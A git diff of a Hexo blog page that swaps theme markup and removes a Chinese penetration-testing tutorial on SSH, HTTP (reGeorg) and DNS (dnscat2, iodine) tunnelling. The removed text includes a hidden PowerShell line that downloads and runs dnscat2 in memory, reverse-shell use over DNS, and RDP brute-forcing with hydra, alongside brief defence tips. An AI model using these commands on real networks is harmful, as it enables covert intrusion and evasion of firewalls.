@@ -2,9 +2,11 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 5.2.0">
+
+
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -13,19 +15,17 @@
 <link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
 
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"sunian19.github.io","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-  <meta name="description" content="SSH协议一个普通的ssh远程连接命令ssh &amp;#114;&amp;#111;&amp;#111;&amp;#x74;&amp;#64;&amp;#x31;&amp;#x39;&amp;#50;&amp;#x2e;&amp;#49;&amp;#x36;&amp;#x38;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;">
+<script class="next-config" data-name="main" type="application/json">{"hostname":"sunian19.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="SSH协议 一个普通的ssh远程连接命令 ssh root@192.168.1.1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="&#39;应用层隧道技术&#39;">
 <meta property="og:url" content="https://sunian19.github.io/2020/03/31/%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/index.html">
-<meta property="og:site_name" content="Sunian&#39;s Blog">
-<meta property="og:description" content="SSH协议一个普通的ssh远程连接命令ssh &amp;#114;&amp;#111;&amp;#111;&amp;#x74;&amp;#64;&amp;#x31;&amp;#x39;&amp;#50;&amp;#x2e;&amp;#49;&amp;#x36;&amp;#x38;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;">
+<meta property="og:site_name" content="zer0_c|imb&#39;s blog">
+<meta property="og:description" content="SSH协议 一个普通的ssh远程连接命令 ssh root@192.168.1.1">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://sunian19.github.io/imgss/p33.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/p34.png">
@@ -42,91 +42,56 @@
 <meta property="og:image" content="https://sunian19.github.io/imgss/a48.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/a49.png">
 <meta property="article:published_time" content="2020-03-31T11:25:04.000Z">
-<meta property="article:modified_time" content="2020-07-12T08:32:07.180Z">
-<meta property="article:author" content="素念">
+<meta property="article:modified_time" content="2020-07-12T08:32:08.000Z">
+<meta property="article:author" content="zer0_c|imb">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="工具">
 <meta property="article:tag" content="协议">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://sunian19.github.io/imgss/p33.png">
 
+
 <link rel="canonical" href="https://sunian19.github.io/2020/03/31/%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true
-  };
-</script>
 
-  <title>'应用层隧道技术' | Sunian's Blog</title>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://sunian19.github.io/2020/03/31/%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/","path":"2020/03/31/应用层隧道技术/","title":"'应用层隧道技术'"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>'应用层隧道技术' | zer0_c|imb's blog</title>
   
 
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?d70c2fd321d2281d853a9197812a8f28";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
-
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?48584c486973b4bf025a425c3d7b4007"></script>
 
 
 
   <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-    <a target="_blank" rel="noopener" href="https://github.com/sunian19" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
   <div class="site-meta">
 
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Sunian's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">zer0_c|imb's blog</h1>
+      <i class="logo-line"></i>
+    </a>
   </div>
 
   <div class="site-nav-right">
@@ -137,306 +102,59 @@
 </div>
 
 
+
 <nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
       </li>
   </ul>
-
 </nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
   <span class="search-icon">
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
            placeholder="搜索..." spellcheck="false"
            type="search" class="search-input">
   </div>
-  <span class="popup-btn-close">
+  <span class="popup-btn-close" role="button">
     <i class="fa fa-times-circle"></i>
   </span>
 </div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
   </div>
 </div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2020/03/31/%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/imgss/touxiang.jpg">
-      <meta itemprop="name" content="素念">
-      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sunian's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          '应用层隧道技术'
-        </h1>
-
-        <div class="post-meta">
-        
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-03-31 19:25:04" itemprop="dateCreated datePublished" datetime="2020-03-31T19:25:04+08:00">2020-03-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-12 16:32:07" itemprop="dateModified" datetime="2020-07-12T16:32:07+08:00">2020-07-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><p>一个普通的ssh远程连接命令<br>ssh <a href="mailto:&#114;&#111;&#111;&#x74;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#46;&#x31;">&#114;&#111;&#111;&#x74;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#46;&#x31;</a></p>
-<a id="more"></a>
-<p>创建SSH隧道常用参数如下:<br>-C：压缩传输，提高传输速度<br>-f：将SSH传输转入后台执行，不占用当前的shell<br>-N：建立静默连接(建立了连接，但看不到具体的会话)<br>-g：允许远程主机连接本地用于转发的端口<br>-L：本地端口转发<br>-R：远程端口转发<br>-D：动态转发(SOCKS代理)<br>-P：指定SSH端口</p>
-<h3 id="1、本地转发"><a href="#1、本地转发" class="headerlink" title="1、本地转发"></a>1、本地转发</h3><blockquote>
-<p>kali(攻击机)执行，会要求输入跳板机密码<br>ssh -CfNg -L 1153(攻击机):1.1.1.10(目标机).3389(目标机) <a href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#49;&#46;&#49;">&#x72;&#111;&#111;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#49;&#46;&#49;</a>(跳板机)<br>netstat -tulnp | grep “1153” 查看端口<br>rdesktop 127.0.0.1:1153 进行连接<br>本地转发是将远程主机某个端口的数据转发到本地机器的指定端口。</p>
-</blockquote>
-<h3 id="2、远程转发"><a href="#2、远程转发" class="headerlink" title="2、远程转发"></a>2、远程转发</h3><blockquote>
-<p>WEB服务器(跳板机)执行<br>ssh -CfNg -R 3307(攻击机):1.1.1.10(目标机):3389(目标机) <a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#x31;&#x2e;&#x34;">&#114;&#x6f;&#111;&#x74;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#x31;&#x2e;&#x34;</a>(攻击机)<br>远程转发是在远程服务器上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。</p>
-</blockquote>
-<h3 id="3、动态转发"><a href="#3、动态转发" class="headerlink" title="3、动态转发"></a>3、动态转发</h3><blockquote>
-<p>kali(攻击机)执行命令，建立SOCKS 4/5代理通道<br>ssh -CfNg -D 7000 <a href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#x2e;&#x31;">&#x72;&#111;&#x6f;&#116;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#49;&#x2e;&#x31;</a>(WEB服务器)<br>配置SOCKS代理 127.0.0.1 7000<br>浏览器访问1.1.1.2(内网web服务器)即可看到web服务</p>
-</blockquote>
-<h3 id="4、防御SSH隧道攻击的思路"><a href="#4、防御SSH隧道攻击的思路" class="headerlink" title="4、防御SSH隧道攻击的思路"></a>4、防御SSH隧道攻击的思路</h3><blockquote>
-<p>系统中配置SSH远程管理白名单，在ACL中限制只有指定IP地址才能访问SSH，以及设置系统完全使用带外管理等。如果没有足够的资源建立带外管理的网络结构，至少限制SSH远程登陆IP，并设置双向访问控制策略(从外到内，从内到外)。</p>
-</blockquote>
-<h2 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP/HTTPS协议"></a>HTTP/HTTPS协议</h2><blockquote>
-<p>HTTP service代理用于将所有的流量转发到内网。常用代理工具有reGeorg、meterpreter、tunna等。<br>reGeorg原理：把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP协议的通信。(会被杀软查杀)<br>下载链接<a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br>将tunnel.jsp脚本(有其他类型脚本,ASPX、PHP、JSP等)上传到目标服务器<br>python reGeorgSocksProxy.py -u <a target="_blank" rel="noopener" href="http://192.168.1.1/tunnel.jsp">http://192.168.1.1/tunnel.jsp</a> -p 9999<br>执行后，配置proxychains 127.0.0.1 9999<br>就可访问目标服务器<br>使用九头蛇(hydra)爆破3389远程桌面连接等操作<br>proxychains hydra -s 3389 -V -l administrator -P /root/destop/passwd.txt -t 8 192.168.1.1 rdp</p>
-</blockquote>
-<h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><blockquote>
-<p>优点：DNS协议难以被禁用，报文具有穿透防火墙的能力。由于防火墙和入侵检测设备(IPS/IDS)大都不会过滤DNS流量，也为DNS成为隐蔽通信创造了条件。<br>DNS隧道工作原理：在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。预期返回的是一个IP地址，但返回的可以是任意字符串，包括加密的C&amp;C指令。<br>使用DNS隧道与外部进行通信时，从表面上看没有连接外网的(内网网关没有转发IP数据包)，但实际上，内网的DNS服务器进行了中转操作。原理简单来说就是将其他协议封装在DNS协议中进行传输。</p>
-</blockquote>
-<h3 id="1、查看DNS的连通性"><a href="#1、查看DNS的连通性" class="headerlink" title="1、查看DNS的连通性"></a>1、查看DNS的连通性</h3><p>查看内部域名及IP地址<br>cat /etc/resolv.conf|grep -v ‘#’</p>
-<p>是否能与内部DNS通信<br>nslookup hack.lab<br><img src="/imgss/p33.png"><br>查询能否通过内部DNS服务器解析外部域名<br>nslookup <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a><br><img src="/imgss/p34.png"></p>
-<h3 id="2、dnscat2"><a href="#2、dnscat2" class="headerlink" title="2、dnscat2"></a>2、dnscat2</h3><p>简介：开源软件，使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证；使用shell及DNS查询类型，多个同时进行的会话类似于SSH中的通道。客户端用C编写，服务端用Ruby编写。</p>
-<p>直连模式：客户端直接指定IP地址的DNS服务器发起DNS解析请求。(内网放行所有DNS请求时使用)<br>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。速度比直连慢。(内网只允许白名单服务器或制定域)</p>
-<p>(1)部署域名解析</p>
-<blockquote>
-<p>搞台VPS安装linux，并配置域名。<br>创建A记录，域名解析服务器指向VPS的IP。再创建NS记录，将dnsch子域名的解析结果指向域名解析服务器(ns1.sunian.top)。<br>PS：注意开放防火墙dnsnat2走的是UDP的流量！<br>验证是否设置成功<br>ping ns1.sunian.top (返回VPS的IP，说明A生效)<br>tcpdump -n -i eth0 udp dst port 53 (VPS上抓包53端口)<br>nslookup vpn.sunian.top (查看抓包情况，抓到DNS请求包，说明NS生效)</p>
-</blockquote>
-<p><img src="/imgss/p35.png"><br><img src="/imgss/a36.png"><br><img src="/imgss/a40.png"></p>
-<p>(2)安装</p>
-<blockquote>
-<p>apt-get install gem<br>apt-get install ruby-dev<br>apt-get install libpq-dev<br>apt-get install ruby-bundler</p>
-</blockquote>
-<blockquote>
-<p>apt-get install git<br>git clone <a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a><br>cd dnscat2/server<br>bundle install</p>
-</blockquote>
-<p>(3)启动服务端</p>
-<blockquote>
-<p>sudo ruby ./dnscat2.rb vpn.sunian.top -e open -c suniana –no-cache<br>如果采用的是直连，可使用以下命令<br>sudo ruby ./dnscat2.rb –dns server=127.0.0.1,port=533,type=TXT –secret=suniana<br>以上命令表示监听533端口，自定义连接密码为”suniana”<br>-c：定义”pre-shared secret”，使用具有预共享密钥的身份验证机制来防止中间人攻击。<br>-e：规定安全级别。”open”代表服务端允许客户端不进行加密。<br>–no-cache：禁止缓存。务必运行服务器时添加该选项。因为powershell-dnscat2与dnscat2的Caching模式不兼容。</p>
-</blockquote>
-<p>(4)目标机安装客户端</p>
-<blockquote>
-<p>linux中：<br>git clone <a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a><br>cd dnscat2/client/<br>make<br>windows中(直接使用编译好的)：<br><a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a></p>
-</blockquote>
-<p>(5)检测是否能通信</p>
-<blockquote>
-<p>dnscat2-v0.07-client-win32.exe –ping vpn.sunian.top<br>显示”creating a ping session!”……. 即可<br>连接服务端<br>dnscat2-v0.07-client-win32.exe –dns domain=vpn.sunian.top –secret suniana<br>连接成功，则显示”session established!”<br><img src="/imgss/a41.png"><br>如果服务端使用的是直连模式(未测试成功)，可直接填写服务端的IP地址(不通过DNS服务商)，向服务端所在IP请求DNS解析。<br>dnscat –dns port=533,server=192.168.1.1,domain=vpn.sunian.top –secret=suniana</p>
-</blockquote>
-<p>(6)推荐使用powershell版本的dnscat2客户端。</p>
-<blockquote>
-<p>直接将脚本拖上去，执行<br>Import-Module ./dnscat2.ps1<br>或使用命令下载<br>IEX(New-Object System.Net.Webclient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;">https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;</a>)<br>加载脚本后，开启服务<br>start-Dnscat2 -Domain vpn.sunian.top -DNSServer 192.168.1.1</p>
-</blockquote>
-<p>(7)使用IEX加载脚本的方式，在内存打开dnscat2客户端</p>
-<blockquote>
-<p>powershell.exe -nop -w hidden -c {IEX(New-Object System.Net.Webclient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;">https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;</a>); start-Dnscat2 -Domain vpn.sunian.top -DNSServer 192.168.1.1}<br>执行以下命令，创建一个控制台，然后执行powershell命令和脚本<br>exec psh</p>
-</blockquote>
-<p>(8)反弹shell</p>
-<blockquote>
-<p>使用方法与Metasploit相似，客户端运行dnscat2.ps1后，可以在服务端看到上线情况<br>New windows created:1<br>session -i 1 (调用sesion，连接shell)<br>exec notepad.exe (打开记事本)<br><img src="/imgss/a42.png"><br><img src="/imgss/a43.png"><br><img src="/imgss/a44.png"></p>
-</blockquote>
-<blockquote>
-<p>命令介绍<br>clear：清屏。<br>delay：修改远程响应延时。<br>exec：执行远程机器上的指定程序。<br>shell：得到一个反弹shell<br>download/upload：在两端之间上传/下载文件。适合小文件。<br>suspend：返回上一层，相当于快捷键”ctrl+z”。<br>listen：类似于SSH隧道的-L参数(本地转发)，例如listen 0.0.0.0:53 192.168.1.1:3389<br>ping：确认目标机器是否在线。返回”pong”，则在线。<br>shutdown：切断当前会话。<br>quit：退出。<br>kill<id>：切断指定通道。<br>set：设置值，例如security=open。<br>windows(session)：列出所有通道。<br>windows -i <id>：连接某个通道。</p>
-</blockquote>
-<blockquote>
-<p>提供多域名并发。即多个子域名绑定同一个NS下，服务端可接收多个客户端<br>ruby dnscat2.rb –dns=port=533 –security=open start –dns domain=<domain>,domain=<domain></p>
-</blockquote>
-<h3 id="3、iodine"><a href="#3、iodine" class="headerlink" title="3、iodine"></a>3、iodine</h3><p>(1)简介</p>
-<blockquote>
-<p>和dnscat2一样分为直连和中继模式。原理：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道连接，处于同一个局域网。连接成功后，客户端会多出一个名为”dns0”的虚拟网卡。<br>PS：域名解析的设置和dnsnat2相同</p>
-</blockquote>
-<p>(2)安装与运行</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/Al1ex/iodine">https://github.com/Al1ex/iodine</a><br>kali、ubantu直接使用以下命令安装<br>apt install iodine<br>运行：<br>iodined -f -c -P suniana 192.168.0.1(自定义局域网IP) vpn.sunian.top -DD<br>完成基本配置后访问<a target="_blank" rel="noopener" href="https://code.kryo.se/iodine/check-it">https://code.kryo.se/iodine/check-it</a><br>检查配置是否正确，也可查看网卡<br><img src="/imgss/a45.png"><br><img src="/imgss/a47.png"></p>
-</blockquote>
-<blockquote>
-<p>命令详解<br>-f：在前台运行。<br>-c：禁止检查所有传入请求的客户端IP地址。<br>-P：设置连接密码。<br>-D：指定调试级别。-DD指2级。D的数量随等级增加。</p>
-</blockquote>
-<blockquote>
-<p>安装客户端<br>iodine -f -P suniana -M 200 vpn.sunian.top<br>PS：需要使用管理员权限启动</p>
-</blockquote>
-<p><img src="/imgss/a46.png"><br>-r：有时会自动切换为UDP通道，该命令强制使用DNS隧道(无论什么情况)<br>-M：指定上行主机名的大小。<br>-m：调节最大下行分片的大小。<br>-T：指定DNS请求类型。可选NULL、PRIVATE、TXT、SRV、CNAME、MX、A。<br>-O：指定数据编码规范。<br>-L：是否开启懒惰模式。<br>-I：指定请求与请求之间的时间间隔。<br><img src="/imgss/a48.png"><br>若出现”Connection setup complete,transmitting data”的提示信息，就代表DNS隧道已建立。</p>
-<p>(3)使用DNS隧道<br>因为处于同一个局域网中，只需直接访问服务端即可。例如，ssh <a href="mailto:&#115;&#x75;&#x6e;&#105;&#97;&#x6e;&#64;&#x31;&#x30;&#x2e;&#48;&#x2e;&#48;&#x2e;&#49;">&#115;&#x75;&#x6e;&#105;&#97;&#x6e;&#64;&#x31;&#x30;&#x2e;&#48;&#x2e;&#48;&#x2e;&#49;</a> 命令。<br><img src="/imgss/a49.png"></p>
-<h2 id="防御DNS隧道攻击"><a href="#防御DNS隧道攻击" class="headerlink" title="防御DNS隧道攻击"></a>防御DNS隧道攻击</h2><p>(1)、禁止网络中任何人向外部服务器发送DNS请求，只允许受信任的DNS服务器通信。<br>(2)、将邮件服务器/网关列入白名单并阻止传入和传出流量中的TXT请求。<br>(3)、跟踪用户的DNS查询次数。达到阈值，就生成相应的报告。<br>(4)、阻止ICMP。</p>
 
     </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
-              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
-              <a href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag"># 协议</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/03/28/WUST-writeup/" rel="prev" title="'WUST-writeup'">
-      <i class="fa fa-chevron-left"></i> 'WUST-writeup'
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/04/01/SOCKS%E4%BB%A3%E7%90%86/" rel="next" title="'SOCKS代理及数据压缩及上传和下载'">
-      'SOCKS代理及数据压缩及上传和下载' <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
   </div>
 
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
